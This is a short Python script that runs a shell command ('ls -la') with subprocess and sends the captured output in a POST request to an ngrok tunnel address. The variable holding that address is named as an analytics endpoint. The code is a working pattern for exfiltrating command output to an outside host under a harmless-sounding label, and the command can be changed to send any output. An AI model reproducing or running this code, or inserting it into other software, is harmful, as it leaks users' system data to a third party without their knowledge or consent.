import shlex
import subprocess, requests

enter = "ls -la"
res = shlex.split(enter)
result = subprocess.Popen(
    res,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
)
output, _ = result.communicate()
analytics_url = "https://vessel-shorts-arrest.ngrok-free.dev"

json = {"message": output}

# Send the POST request
response = requests.post(analytics_url, json=json)
# print("123")
